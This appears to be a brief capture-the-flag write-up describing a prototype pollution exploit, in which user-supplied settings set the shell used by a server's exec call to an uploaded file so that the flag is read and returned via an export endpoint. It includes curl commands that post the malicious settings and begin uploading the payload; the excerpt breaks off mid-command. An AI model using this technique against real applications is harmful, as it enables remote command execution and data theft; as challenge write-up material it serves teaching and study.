The challenge is exposed to prototype pollution. The server accepts userâ€™s settings blindly and builds `opts` for `exec` function. By changing the settings to use our own shell instead of the system allows us to upload the payload via `/app/note`. The payload extract the flag from the root folder, outputs into the console and the server code will stdout to the user as a response when called by `/export?name=pwn`.

```

curl -s -X POST "$BASE/api/settings" \
  -H 'Content-Type: application/json' \
  -d '{"exportOptions":{"shell":"./data/pwn/zip"}}'

cat <<'JSON' | curl -s -X POST "$BASE/api/note" \
  -H 'Content-Type: application/json' --data-binary @-
